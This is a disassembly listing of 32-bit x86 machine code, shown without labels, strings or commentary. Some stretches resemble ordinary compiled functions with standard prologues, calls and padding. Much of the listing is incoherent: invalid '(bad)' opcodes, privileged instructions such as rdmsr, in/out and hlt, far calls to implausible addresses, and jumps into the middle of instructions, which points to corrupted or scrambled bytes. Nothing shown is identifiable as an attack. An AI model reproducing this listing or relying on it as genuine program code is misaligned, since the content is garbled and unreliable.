  409c46:	f7 d8                	neg    %eax
  409c48:	18 4a 5e             	sbb    %cl,0x5e(%edx)
  409c4b:	25 78 11 01 00       	and    $0x11178,%eax
  409c50:	5b                   	pop    %ebx
  409c51:	8b e5                	mov    %ebp,%esp
  409c53:	5d                   	pop    %ebp
  409c54:	c3                   	ret
  409c55:	90                   	nop
  409c56:	31 53 90             	xor    %edx,-0x70(%ebx)
  409c59:	90                   	nop
  409c5a:	69 90 f4 90 90 90 36 	imul   $0x8b0a8b36,-0x6f6f6f0c(%eax),%edx
  409c61:	8b 0a 8b 
  409c64:	45                   	inc    %ebp
  409c65:	08 50 9e             	or     %dl,-0x62(%eax)
  409c68:	15 c0 c0 40 00       	adc    $0x40c0c0,%eax
  409c6d:	33 c0                	xor    %eax,%eax
  409c6f:	5d                   	pop    %ebp
  409c70:	d4 6c                	aam    $0x6c
  409c72:	90                   	nop
  409c73:	90                   	nop
  409c74:	90                   	nop
  409c75:	90                   	nop
  409c76:	90                   	nop
  409c77:	72 90                	jb     0x409c09
  409c79:	90                   	nop
  409c7a:	90                   	nop
  409c7b:	90                   	nop
  409c7c:	90                   	nop
  409c7d:	90                   	nop
  409c7e:	90                   	nop
  409c7f:	fc                   	cld
  409c80:	55                   	push   %ebp
  409c81:	8b ec                	mov    %esp,%ebp
  409c83:	83 9d 20 53 33 43 aa 	sbbl   $0xffffffaa,0x43335320(%ebp)
  409c8a:	57                   	push   %edi
  409c8b:	c4 7d 0c             	les    0xc(%ebp),%edi
  409c8e:	5a                   	pop    %edx
  409c8f:	45                   	inc    %ebp
  409c90:	ec                   	in     (%dx),%al
  409c91:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409c94:	8b c7                	mov    %edi,%eax
  409c96:	33 70 25             	xor    0x25(%eax),%esi
  409c99:	d5 09                	aad    $0x9
  409c9b:	82 00 81             	addb   $0x81,(%eax)
  409c9e:	5d                   	pop    %ebp
  409c9f:	e0 89                	loopne 0x409c2a
  409ca1:	04 e4                	add    $0xe4,%al
  409ca3:	73 38                	jae    0x409cdd
  409ca5:	e8 89 45 fc 74       	call   0x753ce233
  409caa:	4d                   	dec    %ebp
  409cab:	39 1d 84 06 41 12    	cmp    %ebx,0x12410684
  409cb1:	75 45                	jne    0x409cf8
  409cb3:	b9 68 36 6b bb       	mov    $0xbb6b3668,%ecx
  409cb8:	53                   	push   %ebx
  409cb9:	53                   	push   %ebx
  409cba:	53                   	push   %ebx
  409cbb:	59                   	pop    %ecx
  409cbc:	53                   	push   %ebx
  409cbd:	53                   	push   %ebx
  409cbe:	da 53 8d             	ficoml -0x73(%ebx)
  409cc1:	b1 f4                	mov    $0xf4,%cl
  409cc3:	c5 01                	lds    (%ecx),%eax
  409cc5:	51                   	push   %ecx
  409cc6:	88 5d f4             	mov    %bl,-0xc(%ebp)
  409cc9:	88 5d f5             	mov    %bl,-0xb(%ebp)
  409ccc:	88 5d 4c             	mov    %bl,0x4c(%ebp)
  409ccf:	8c 5d f7             	mov    %ds,-0x9(%ebp)
  409cd2:	88 5d f8             	mov    %bl,-0x8(%ebp)
  409cd5:	c6 45 f9 01          	movb   $0x1,-0x7(%ebp)
  409cd9:	45                   	inc    %ebp
  409cda:	15 38 c0 40 00       	adc    $0x40c038,%eax
  409cdf:	85 c0                	test   %eax,%eax
  409ce1:	74 0f                	je     0x409cf2
  409ce3:	68 80 9e 9f 00       	push   $0x9f9e80
  409ce8:	e8 3f 18 00 00       	call   0x40b52c
  409ced:	83 c4 ba             	add    $0xffffffba,%esp
  409cf0:	eb 06                	jmp    0x409cf8
  409cf2:	89 1d 84 06 41 00    	mov    %ebx,0x410684
  409cf8:	89 75 08             	mov    %esi,0x8(%ebp)
  409cfb:	20 e8                	and    %ch,%al
  409cfd:	00 00                	add    %al,(%eax)
  409cff:	10 00                	adc    %al,(%eax)
  409d01:	74 6f                	je     0x409d72
  409d03:	f7 99 59 aa 00 01    	negl   0x100aa59(%ecx)
  409d09:	00 74 95 a1          	add    %dh,-0x5f(%ebp,%edx,4)
  409d0d:	9b                   	fwait
  409d0e:	06                   	push   %es
  409d0f:	41                   	inc    %ecx
  409d10:	00 8b 7b f8 47 c3    	add    %cl,-0x3cb80785(%ebx)
  409d16:	c7                   	(bad)
  409d17:	1b 0e                	sbb    (%esi),%ecx
  409d19:	81 00 00 00 89 55    	addl   $0x55890000,(%eax)
  409d1f:	96                   	xchg   %eax,%esi
  409d20:	75 1d                	jne    0x409d3f
  409d22:	f3 43                	repz inc %ebx
  409d24:	8c 01                	mov    %es,(%ecx)
  409d26:	41                   	inc    %ecx
  409d27:	00 6a 01             	add    %ch,0x1(%edx)
  409d2a:	e8 99 0c 00 5f       	call   0x5f40a9c8
  409d2f:	83 28 0c             	subl   $0xc,(%eax)
  409d32:	3b c3                	cmp    %ebx,%eax
  409d34:	a3 48 06 41 68       	mov    %eax,0x68410648
  409d39:	0f 84 67 14 c9 24    	je     0x2509b1a6
  409d3f:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  409d42:	8d 55 e0             	lea    -0x20(%ebp),%edx
  409d45:	51                   	push   %ecx
  409d46:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409d49:	52                   	push   %edx
  409d4a:	51                   	push   %ecx
  409d4b:	5c                   	pop    %esp
  409d4c:	70 3b                	jo     0x409d89
  409d4e:	c3                   	ret
  409d4f:	75 21                	jne    0x409d72
  409d51:	8b 55 0c             	mov    0xc(%ebp),%edx
  409d54:	6a 9d                	push   $0xffffff9d
  409d56:	52                   	push   %edx
  409d57:	80 76 01 00          	xorb   $0x0,0x1(%esi)
  409d5b:	00 8b 4e f4 b7 c4    	add    %cl,-0x3b480bb2(%ebx)
  409d61:	08 0b                	or     %cl,(%ebx)
  409d63:	c8 8c 46 04          	enter  $0x468c,$0x4
  409d67:	6c                   	insb   (%dx),%es:(%edi)
  409d68:	00 2c 10             	add    %ch,(%eax,%edx,1)
  409d6b:	00 44 ce cf          	add    %al,-0x31(%esi,%ecx,8)
  409d6f:	89 46 cd             	mov    %eax,-0x33(%esi)
  409d72:	f7 c7 11 00 64 00    	test   $0x640011,%edi
  409d78:	0f 32                	rdmsr
  409d7a:	81 00 00 00 de 4d    	addl   $0x4dde0000,(%eax)
  409d80:	04 00                	add    $0x0,%al
  409d82:	00 02                	add    %al,(%edx)
  409d84:	46                   	inc    %esi
  409d85:	74 78                	je     0x409dff
  409d87:	8b 46 ef             	mov    -0x11(%esi),%eax
  409d8a:	c7                   	(bad)
  409d8b:	e1 3a                	loope  0x409dc7
  409d8d:	02 00                	add    (%eax),%al
  409d8f:	00 00                	add    %al,(%eax)
  409d91:	89 45 5d             	mov    %eax,0x5d(%ebp)
  409d94:	a1 48 06 41 00       	mov    0x410648,%eax
  409d99:	3b c3                	cmp    %ebx,%eax
  409d9b:	75 19                	jne    0x409db6
  409d9d:	53                   	push   %ebx
  409d9e:	4f                   	dec    %edi
  409d9f:	8c 01                	mov    %es,(%ecx)
  409da1:	34 00                	xor    $0x0,%al
  409da3:	6a 01                	push   $0x1
  409da5:	e8 0f 0b 00 00       	call   0x40a8b9
  409daa:	83 c4 0c             	add    $0xc,%esp
  409dad:	3f                   	aas
  409dae:	c3                   	ret
  409daf:	a3 48 3b 41 00       	mov    %eax,0x413b48
  409db4:	9c                   	pushf
  409db5:	1a 3e                	sbb    (%esi),%bh
  409db7:	4d                   	dec    %ebp
  409db8:	0c 8d                	or     $0x8d,%al
  409dba:	55                   	push   %ebp
  409dbb:	e0 51                	loopne 0x409e0e
  409dbd:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409dc0:	c0 51 ff d0          	rclb   $0xd0,-0x1(%ecx)
  409dc4:	eb 14                	jmp    0x409dda
  409dc6:	6a 01                	push   $0x1
  409dc8:	ff 15 4c c0 40 00    	call   *0x40c04c
  409dce:	eb 81                	jmp    0x409d51
  409dd0:	6a 01                	push   $0x1
  409dd2:	ff 15 66 c0 40 87    	call   *0x8740c066
  409dd8:	eb ac                	jmp    0x409d86
  409dda:	3b c3                	cmp    %ebx,%eax
  409ddc:	75 21                	jne    0x409dff
  409dde:	8b 55 3c             	mov    0x3c(%ebp),%edx
  409de1:	6a 04                	push   $0x4
  409de3:	52                   	push   %edx
  409de4:	e8 b7 00 6f 00       	call   0xaf9ea0
  409de9:	8b 4e 08             	mov    0x8(%esi),%ecx
  409dec:	83 c4 08             	add    $0x8,%esp
  409def:	0b c8                	or     %eax,%ecx
  409df1:	8b 46 04             	mov    0x4(%esi),%eax
  409df4:	0d d7 00 20 00       	or     $0x2000d7,%eax
  409df9:	dc 4e 08             	fmull  0x8(%esi)
  409dfc:	89 46 04             	mov    %eax,0x4(%esi)
  409dff:	39 5d 87             	cmp    %ebx,-0x79(%ebp)
  409e02:	74 67                	je     0x409e6b
  409e04:	a1 84 06 41 00       	mov    0x410684,%eax
  409e09:	3b c3                	cmp    %ebx,%eax
  409e0b:	74 5e                	je     0x409e6b
  409e0d:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409e10:	a1 6e 06 41 00       	mov    0x41066e,%eax
  409e15:	3b c3                	cmp    %ebx,%eax
  409e17:	8a af ec 05 00 00    	mov    0x5ec(%edi),%ch
  409e1d:	5c                   	pop    %esp
  409e1e:	75 6a                	jne    0x409e8a
  409e20:	53                   	push   %ebx
  409e21:	9c                   	pushf
  409e22:	8c 01                	mov    %es,(%ecx)
  409e24:	41                   	inc    %ecx
  409e25:	00 6a 01             	add    %ch,0x1(%edx)
  409e28:	e8 13 0b 00 00       	call   0x40a940
  409e2d:	83 c4 13             	add    $0x13,%esp
  409e30:	3b d0                	cmp    %eax,%edx
  409e32:	a3 48 06 41 00       	mov    %eax,0x410648
  409e37:	74 39                	je     0x409e72
  409e39:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  409e3c:	8d 55 d6             	lea    -0x2a(%ebp),%edx
  409e3f:	9a 8b 59 45 52 51 ff 	lcall  $0xff51,$0x5245598b
  409e46:	d0 3b                	sarb   $1,(%ebx)
  409e48:	c3                   	ret
  409e49:	75 20                	jne    0x409e6b
  409e4b:	8b d0                	mov    %eax,%edx
  409e4d:	0c 57                	or     $0x57,%al
  409e4f:	52                   	push   %edx
  409e50:	e8 e2 00 00 00       	call   0x409f37
  409e55:	8b 4e 08             	mov    0x8(%esi),%ecx
  409e58:	83 c4 e7             	add    $0xffffffe7,%esp
  409e5b:	0b 63 ee             	or     -0x12(%ebx),%esp
  409e5e:	ea 04 0d 00 33 40 00 	ljmp   $0x40,$0x33000d04
  409e65:	fb                   	sti
  409e66:	4e                   	dec    %esi
  409e67:	08 89 46 04 38 5e    	or     %cl,0x5e380446(%ecx)
  409e6d:	5b                   	pop    %ebx
  409e6e:	3e e5 5d             	ds in  $0x5d,%eax
  409e71:	23 6a 01             	and    0x1(%edx),%ebp
  409e74:	ff 15 4c c0 40 00    	call   *0x40c04c
  409e7a:	c9                   	leave
  409e7b:	cf                   	iret
  409e7c:	90                   	nop
  409e7d:	90                   	nop
  409e7e:	90                   	nop
  409e7f:	90                   	nop
  409e80:	a1 84 06 ee 00       	mov    0xee0684,%eax
  409e85:	85 c0                	test   %eax,%eax
  409e87:	74 11                	je     0x409e9a
  409e89:	50                   	push   %eax
  409e8a:	ff 59 00             	lcall  *0x0(%ecx)
  409e8d:	af                   	scas   %es:(%edi),%eax
  409e8e:	40                   	inc    %eax
  409e8f:	fc                   	cld
  409e90:	eb 05                	jmp    0x409e97
  409e92:	84 06                	test   %al,(%esi)
  409e94:	41                   	inc    %ecx
  409e95:	00 00                	add    %al,(%eax)
  409e97:	00 00                	add    %al,(%eax)
  409e99:	00 c3                	add    %al,%bl
  409e9b:	90                   	nop
  409e9c:	7c 90                	jl     0x409e2e
  409e9e:	3f                   	aas
  409e9f:	bd 55 cf ec 8a       	mov    $0x8aeccf55,%ebp
  409ea4:	4d                   	dec    %ebp
  409ea5:	08 33                	or     %dh,(%ebx)
  409ea7:	c0 96 c1 20 08 05 b8 	rclb   $0xb8,0x50820c1(%esi)
  409eae:	01 00                	add    %eax,(%eax)
  409eb0:	00 00                	add    %al,(%eax)
  409eb2:	f6 95 02 74 02 0c    	notb   0xc027402(%ebp)
  409eb8:	02 f6                	add    %dh,%dh
  409eba:	95                   	xchg   %eax,%ebp
  409ebb:	be 74 02 0c 04       	mov    $0x40c0274,%esi
  409ec0:	f8                   	clc
  409ec1:	4d                   	dec    %ebp
  409ec2:	0c d3                	or     $0xd3,%al
  409ec4:	24 5d                	and    $0x5d,%al
  409ec6:	c3                   	ret
  409ec7:	4b                   	dec    %ebx
  409ec8:	90                   	nop
  409ec9:	90                   	nop
  409eca:	90                   	nop
  409ecb:	90                   	nop
  409ecc:	90                   	nop
  409ecd:	6b 63 90 8f          	imul   $0xffffff8f,-0x70(%ebx),%esp
  409ed1:	8b ec                	mov    %esp,%ebp
  409ed3:	8b 45 08             	mov    0x8(%ebp),%eax
  409ed6:	8b 48 08             	mov    0x8(%eax),%ecx
  409ed9:	1f                   	pop    %ds
  409eda:	c1 0e b8             	rorl   $0xb8,(%esi)
  409edd:	00 10                	add    %dl,(%eax)
  409edf:	74 05                	je     0x409ee6
  409ee1:	83 1c cd eb 03 83 c9 	sbbl   $0x7,-0x367cfc15(,%ecx,8)
  409ee8:	07 
  409ee9:	8b d1                	mov    %ecx,%edx
  409eeb:	89 48 08             	mov    %ecx,0x8(%eax)
  409eee:	c1 e2 04             	shl    $0x4,%edx
  409ef1:	0b d1                	or     %ecx,%edx
  409ef3:	c1 73 04 0b          	shll   $0xb,0x4(%ebx)
  409ef7:	d1 8b 48 04 f1 c9    	rorl   $1,-0x360efbb8(%ebx)
  409efd:	00 00                	add    %al,(%eax)
  409eff:	70 00                	jo     0x409f01
  409f01:	89 50 08             	mov    %edx,0x8(%eax)
  409f04:	40                   	inc    %eax
  409f05:	48                   	dec    %eax
  409f06:	04 8b                	add    $0x8b,%al
  409f08:	ed                   	in     (%dx),%eax
  409f09:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  409f0c:	f7 d0                	not    %eax
  409f0e:	23 9b f7 4c 1b c0    	and    -0x3fe4b309(%ebx),%ebx
  409f14:	ca 78 bb             	lret   $0xbb78
  409f17:	01 00                	add    %eax,(%eax)
  409f19:	5d                   	pop    %ebp
  409f1a:	57                   	push   %edi
  409f1b:	90                   	nop
  409f1c:	90                   	nop
  409f1d:	f7 0a 90 55 8b ec    	testl  $0xec8b5590,(%edx)
  409f23:	53                   	push   %ebx
  409f24:	e1 aa                	loope  0x409ed0
  409f26:	0c 56                	or     $0x56,%al
  409f28:	8b 75 96             	mov    -0x6a(%ebp),%esi
  409f2b:	57                   	push   %edi
  409f2c:	46                   	inc    %esi
  409f2d:	18 61 00             	sbb    %ah,0x0(%ecx)
  409f30:	00 aa c0 8b fe f3    	add    %ch,-0xc017440(%edx)
  409f36:	ab                   	stos   %eax,%es:(%edi)
  409f37:	8b 98 06 33 d2 23    	mov    0x23d23306(%eax),%ebx
  409f3d:	20 00                	and    %al,(%eax)
  409f3f:	00 1a                	add    %bl,(%edx)
  409f41:	89 55 0c             	mov    %edx,0xc(%ebp)
  409f44:	89 46 38             	mov    %eax,0x38(%esi)
  409f47:	89 56 3c             	mov    %edx,0x3c(%esi)
  409f4a:	e8 21 19 5d 00       	call   0x9db870
  409f4f:	89 46 38             	mov    %eax,0x38(%esi)
  409f52:	1c c7                	sbb    $0xc7,%al
  409f54:	e6 b1                	out    %al,$0xb1
  409f56:	4b                   	dec    %ebx
  409f57:	0c 8b                	or     $0x8b,%al
  409f59:	d0 48 46             	rorb   $1,0x46(%eax)
  409f5c:	3c 33                	cmp    $0x33,%al
  409f5e:	ff 72 20             	push   0x20(%edx)
  409f61:	96                   	xchg   %eax,%esi
  409f62:	c7                   	(bad)
  409f63:	89 56 38             	mov    %edx,0x38(%esi)
  409f66:	89 46 3c             	mov    %eax,0x3c(%esi)
  409f69:	63 8b d0 8b 46 38    	arpl   %ecx,0x38468bd0(%ebx)
  409f6f:	6a 0a                	push   $0xa
  409f71:	52                   	push   %edx
  409f72:	24 e8                	and    $0xe8,%al
  409f74:	18 16                	sbb    %dl,(%esi)
  409f76:	00 00                	add    %al,(%eax)
  409f78:	89 b6 67 8b 4e 3c    	mov    %esi,0x3c4e8b67(%esi)
  409f7e:	8b d0                	mov    %eax,%edx
  409f80:	89 46 83             	mov    %eax,-0x7d(%esi)
  409f83:	81 6d 00 c0 79 b7 81 	subl   $0x81b779c0,0x0(%ebp)
  409f8a:	d1 69 13             	shrl   $1,0x13(%ecx)
  409f8d:	ca f2 89             	lret   $0x89f2
  409f90:	56                   	push   %esi
  409f91:	38 89 4e b8 8b b7    	cmp    %cl,-0x487447b2(%ecx)
  409f97:	08 df                	or     %bl,%bh
  409f99:	4e                   	dec    %esi
  409f9a:	80 14 c1 8b          	adcb   $0x8b,(%ecx,%eax,8)
  409f9e:	d7                   	xlat   %ds:(%ebx)
  409f9f:	b9 20 00 00 f5       	mov    $0xf5000020,%ecx
  409fa4:	89 7e e5             	mov    %edi,-0x1b(%esi)
  409fa7:	e8 c4 18 00 00       	call   0x40b870
  409fac:	89 82 48 89 cc 4c    	mov    %eax,0x4ccc8948(%edx)
  409fb2:	8b 53 04             	mov    0x4(%ebx),%edx
  409fb5:	8b 07                	mov    (%edi),%eax
  409fb7:	4c                   	dec    %esp
  409fb8:	0b 03                	or     (%ebx),%eax
  409fba:	66 cf                	iretw
  409fbc:	f4                   	hlt
  409fbd:	46                   	inc    %esi
  409fbe:	48                   	dec    %eax
  409fbf:	f5                   	cmc
  409fc0:	4e                   	dec    %esi
  409fc1:	95                   	xchg   %eax,%ebp
  409fc2:	57                   	push   %edi
  409fc3:	db c1                	fcmovnb %st(1),%st
  409fc5:	8b 4e ab             	mov    -0x55(%esi),%ecx
  409fc8:	6a 0a                	push   $0xa
  409fca:	50                   	push   %eax
  409fcb:	24 e8                	and    $0xe8,%al
  409fcd:	bf 15 00 00 89       	mov    $0x89000015,%edi
  409fd2:	46                   	inc    %esi
  409fd3:	48                   	dec    %eax
  409fd4:	05 00 c0 79 b7       	add    $0xb779c000,%eax
  409fd9:	89 56 4c             	mov    %edx,0x4c(%esi)
  409fdc:	89 46 48             	mov    %eax,0x48(%esi)
  409fdf:	81 8f 69 a1 d6 ff 31 	orl    $0xcf982031,-0x295e97(%edi)
  409fe6:	20 98 cf 
  409fe9:	00 89 56 4c 8b 53    	add    %cl,0x538b4c56(%ecx)
  409fef:	18 89 56 40 8b 94    	sbb    %cl,-0x6b74bfaa(%ecx)
  409ff5:	b7 d7                	mov    $0xd7,%bh
  409ff7:	89 63 44             	mov    %esp,0x44(%ebx)
  409ffa:	44                   	inc    %esp
  409ffb:	a9 92 00 00 89       	test   $0x89000092,%eax
  40a000:	46                   	inc    %esi
  40a001:	40                   	inc    %eax
  40a002:	8b 4e 8d             	mov    -0x73(%esi),%ecx
  40a005:	89 ac d5 8b 43 14 0b 	mov    %ebp,0xb14438b(%ebp,%edx,8)
  40a00c:	c8 8b c2 89          	enter  $0xc28b,$0x89
  40a010:	4e                   	dec    %esi
  40a011:	f5                   	cmc
  40a012:	8b 5c 40 0b          	mov    0xb(%eax,%eax,2),%ebx
  40a016:	c7                   	(bad)
  40a017:	57                   	push   %edi
  40a018:	8b b7 6a 9f 51 52    	mov    0x52519f6a(%edi),%esi
  40a01e:	89 46 44             	mov    %eax,0x44(%esi)
  40a021:	e8 6a bd 00 00       	call   0x415d90
  40a026:	89 56 44             	mov    %edx,0x44(%esi)
  40a029:	8b 4e 92             	mov    -0x6e(%esi),%ecx
  40a02c:	8b d0                	mov    %eax,%edx
  40a02e:	89 46 40             	mov    %eax,0x40(%esi)
  40a031:	8b 45 10             	mov    0x10(%ebp),%eax
  40a034:	81 c2 00 c0 79 b7    	add    $0xb779c000,%edx
  40a03a:	81 4a 69 a1 d6 ff 89 	orl    $0x89ffd6a1,0x69(%edx)
  40a041:	56                   	push   %esi
  40a042:	14 89                	adc    $0x89,%al
  40a044:	4e                   	dec    %esi
  40a045:	c3                   	ret
  40a046:	23 54 83 1c          	and    0x1c(%ebx,%eax,4),%edx
  40a04a:	8b 44 83 20          	mov    0x20(%ebx,%eax,4),%eax
  40a04e:	33 c9                	xor    %ecx,%ecx
  40a050:	0b d7                	or     %edi,%edx
  40a052:	0b c8                	or     %eax,%ecx
  40a054:	8b 45 14             	mov    0x14(%ebp),%eax
  40a057:	89 56 2c             	mov    %edx,0x2c(%esi)
  40a05a:	ba 01 4f 00 00       	mov    $0x4f01,%edx
  40a05f:	9c                   	pushf
  40a060:	4e                   	dec    %esi
  40a061:	28 23                	sub    %ah,(%ebx)
  40a063:	c2 65 10             	ret    $0x1065
  40a066:	8b 0b                	mov    (%ebx),%ecx
  40a068:	f6 c5 04             	test   $0x4,%ch
  40a06b:	74 ed                	je     0x40a05a
  40a06d:	82 21 0c             	andb   $0xc,(%ecx)
  40a070:	06                   	push   %es
  40a071:	00 00                	add    %al,(%eax)
  40a073:	00 eb                	add    %ch,%bl
  40a075:	3c 26                	cmp    $0x26,%al
  40a077:	0b d1                	or     %ecx,%edx
  40a079:	c1 10 74             	rcll   $0x74,(%eax)
  40a07c:	09 c7                	or     %eax,%edi
  40a07e:	46                   	inc    %esi
  40a07f:	0c 02                	or     $0x2,%al
  40a081:	00 00                	add    %al,(%eax)
  40a083:	00 eb                	add    %ch,%bl
  40a085:	2c e0                	sub    $0xe0,%al
  40a087:	5a                   	pop    %edx
  40a088:	40                   	inc    %eax
  40a089:	74 09                	je     0x40a094
  40a08b:	c7 46 0c 03 00 00 00 	movl   $0x3,0xc(%esi)
  40a092:	eb 1e                	jmp    0x40a0b2
  40a094:	8b 4b 14             	mov    0x14(%ebx),%ecx
  40a097:	85 c9                	test   %ecx,%ecx
  40a099:	37                   	aaa
  40a09a:	14 8b                	adc    $0x8b,%al
  40a09c:	f0 60                	lock pusha
  40a09e:	85 c9                	test   %ecx,%ecx
  40a0a0:	75 0d                	jne    0x40a0af
  40a0a2:	8b 4e 28             	mov    0x28(%esi),%ecx
  40a0a5:	8b c7                	mov    %edi,%eax
  40a0a7:	2c 0b                	sub    $0xb,%al
  40a0a9:	cf                   	iret
  40a0aa:	75 03                	jne    0x40a0af
  40a0ac:	89 55 0c             	mov    %edx,0xc(%ebp)
  40a0af:	89 56 0c             	mov    %edx,0xc(%esi)
  40a0b2:	1a a4 74 d1 c7 d8 08 	sbb    0x8d8c7d1(%esp,%esi,2),%ah
  40a0b9:	00 00                	add    %al,(%eax)
  40a0bb:	00 10                	add    %dl,(%eax)
  40a0bd:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40a0c0:	c7 46 a0 70 32 00 00 	movl   $0x3270,-0x60(%esi)
  40a0c7:	85 c9                	test   %ecx,%ecx
  40a0c9:	74 bb                	je     0x40a086
  40a0cb:	24 fb                	and    $0xfb,%al
  40a0cd:	74 43                	je     0x40a112
  40a0cf:	81 46 04 01 00 00 a1 	addl   $0xa1000001,0x4(%esi)
  40a0d6:	8b 91 0c 5f 5e 5b    	mov    0x5b5e5f0c(%ecx),%edx
  40a0dc:	5d                   	pop    %ebp
  40a0dd:	22 90 90 90 8b ec    	and    -0x13746f70(%eax),%dl
  40a0e3:	83 ec 53             	sub    $0x53,%esp
  40a0e6:	63 57 8b             	arpl   %edx,-0x75(%edi)
  40a0e9:	ba 10 8a 47 2c       	mov    $0x2c478a10,%edx
  40a0ee:	84 c0                	test   %al,%al
  40a0f0:	74 0e                	je     0x40a100
  40a0f2:	04 e8                	add    $0xe8,%al
  40a0f4:	d8 0f                	fmuls  (%edi)
  40a0f6:	86 17                	xchg   %dl,(%edi)
  40a0f8:	74 c0                	je     0x40a0ba
  40a0fa:	0f 21 d5             	mov    %db2,%ebp
  40a0fd:	00 4a 00             	add    %cl,0x0(%edx)
  40a100:	ff 4f 04             	decl   0x4(%edi)
  40a103:	8d 45 34             	lea    0x34(%ebp),%eax
  40a106:	50                   	push   %eax
  40a107:	51                   	push   %ecx
  40a108:	ff e4                	jmp    *%esp
  40a10a:	61                   	popa
  40a10b:	64 40                	fs inc %eax
  40a10d:	8c 85 c0 75 1f 8b    	mov    %es,-0x74e08a40(%ebp)
  40a113:	35 98 c0 40 00       	xor    $0x40c098,%eax
  40a118:	85 d6                	test   %edx,%esi
  40a11a:	85 c0                	test   %eax,%eax
  40a11c:	0f 84 b1 00 00 00    	je     0x40a1d3
  40a122:	ff d6                	call   *%esi
  40a124:	5f                   	pop    %edi
  40a125:	05 80 2e 7b 00       	add    $0x7b2e80,%eax
  40a12a:	5e                   	pop    %esi
  40a12b:	8b e5                	mov    %ebp,%esp
  40a12d:	5d                   	pop    %ebp
  40a12e:	c2 0c 88             	ret    $0x880c
  40a131:	8b 55 0c             	mov    0xc(%ebp),%edx
  40a134:	8b 75 08             	mov    0x8(%ebp),%esi
  40a137:	51                   	push   %ecx
  40a138:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40a13b:	6a 01                	push   $0x1
  40a13d:	50                   	push   %eax
  40a13e:	56                   	push   %esi
  40a13f:	e8 dc 64 ff ff       	call   0x400620
  40a144:	8b f5                	mov    %ebp,%esi
  40a146:	0c 83                	or     $0x83,%al
  40a148:	2e e0 83             	loopne,pn 0x40a0ce
  40a14b:	f8                   	clc
  40a14c:	01 75 28             	add    %esi,0x28(%ebp)
  40a14f:	8b 4f 04             	mov    0x4(%edi),%ecx
  40a152:	51                   	push   %ecx
  40a153:	ff 15 48 c0 40 b6    	call   *0xb640c048
  40a159:	85 c0                	test   %eax,%eax
  40a15b:	74 d2                	je     0x40a12f
  40a15d:	83 88 09 75 09 8e 46 	orl    $0x46,-0x71f68af7(%eax)
  40a164:	0c 03                	or     $0x3,%al
  40a166:	00 00                	add    %al,(%eax)
  40a168:	00 eb                	add    %ch,%bl
  40a16a:	0c 83                	or     $0x83,%al
  40a16c:	f8                   	clc
  40a16d:	03 75 07             	add    0x7(%ebp),%esi
  40a170:	33 c0                	xor    %eax,%eax
  40a172:	7b ff                	jnp    0x40a173
  40a174:	00 00                	add    %al,(%eax)
  40a176:	00 8b 29 33 c9 89    	add    %cl,-0x7636ccd7(%ebx)
  40a17c:	16                   	push   %ss
  40a17d:	8b 47 f0             	mov    -0x10(%edi),%eax
  40a180:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40a183:	89 46 50             	mov    %eax,0x50(%esi)
  40a186:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a189:	53                   	push   %ebx
  40a18a:	51                   	push   %ecx
  40a18b:	c8 8b 46 d5          	enter  $0x468b,$0xd5
  40a18f:	24 4e                	and    $0x4e,%al
  40a191:	18 8b 4d e8 b1 cc    	sbb    %cl,-0x334e17b3(%ebx)
  40a197:	70 33                	jo     0x40a1cc
  40a199:	db 89 4e 20 5d 4d    	fisttpl 0x4d5d204e(%ecx)
  40a19f:	0c 89                	or     $0x89,%al
  40a1a1:	46                   	inc    %esi
  40a1a2:	5b                   	pop    %ebx
  40a1a3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a1a4:	d3 f7                	shl    %cl,%edi
  40a1a6:	d0 89 4f 1c 8b 55    	rorb   $1,0x558b1c4f(%ecx)
  40a1ac:	22 23                	and    (%ebx),%ah
  40a1ae:	40                   	inc    %eax
  40a1af:	89 56 24             	mov    %edx,0x24(%esi)
  40a1b2:	f7 c1 ff 56 ff fd    	test   $0xfdff56ff,%ecx
  40a1b8:	5b                   	pop    %ebx
  40a1b9:	74 18                	je     0x40a1d3
  40a1bb:	8b 47 04             	mov    0x4(%edi),%eax
  40a1be:	72 00                	jb     0x40a1c0
  40a1c0:	51                   	push   %ecx
  40a1c1:	50                   	push   %eax
  40a1c2:	56                   	push   %esi
  40a1c3:	47                   	inc    %edi
  40a1c4:	d8 f4                	fdiv   %st(4),%st
  40a1c6:	ff a6 83 c4 10 5f    	jmp    *0x5f10c483(%esi)
  40a1cc:	5e                   	pop    %esi
  40a1cd:	7a e5                	jp     0x40a1b4
  40a1cf:	d6                   	salc
  40a1d0:	c2 34 00             	ret    $0x34
  40a1d3:	33 2a                	xor    (%edx),%ebp
  40a1d5:	5f                   	pop    %edi
  40a1d6:	55                   	push   %ebp
  40a1d7:	8b e5                	mov    %ebp,%esp
  40a1d9:	5d                   	pop    %ebp
  40a1da:	c2 0c 00             	ret    $0xc
  40a1dd:	90                   	nop
  40a1de:	90                   	nop
  40a1df:	90                   	nop
  40a1e0:	55                   	push   %ebp
  40a1e1:	8b ec                	mov    %esp,%ebp
  40a1e3:	56                   	push   %esi
  40a1e4:	57                   	push   %edi
  40a1e5:	8b 7d 10             	mov    0x10(%ebp),%edi
  40a1e8:	0b 24 de             	or     (%esi,%ebx,8),%esp
  40a1eb:	82 70 9a ff          	xorb   $0xff,-0x66(%eax)
  40a1ef:	ff 8b 75 08 8a 4d    	decl   0x4d8a0875(%ebx)
  40a1f5:	0c 89                	or     $0x89,%al
  40a1f7:	29 54 38 b8          	sub    %edx,-0x48(%eax,%edi,1)
  40a1fb:	02 00                	add    (%eax),%al
  40a1fd:	00 00                	add    %al,(%eax)
  40a1ff:	84 c8                	test   %cl,%al
  40a201:	74 1e                	je     0x40a221
  40a203:	29 06                	sub    %eax,(%esi)
  40a205:	6a 00                	push   $0x0
  40a207:	3e 01 af 00 6a 00 c7 	add    %ebp,%ds:-0x38ff9600(%edi)
  40a20e:	40                   	inc    %eax
  40a20f:	04 01                	add    $0x1,%al
  40a211:	00 a5 00 ea 15 a0    	add    %ah,-0x5fea1600(%ebp)
  40a217:	eb 40                	jmp    0x40a259
  40a219:	00 8b 0e 16 41 84    	add    %cl,-0x7bbee9f2(%ebx)
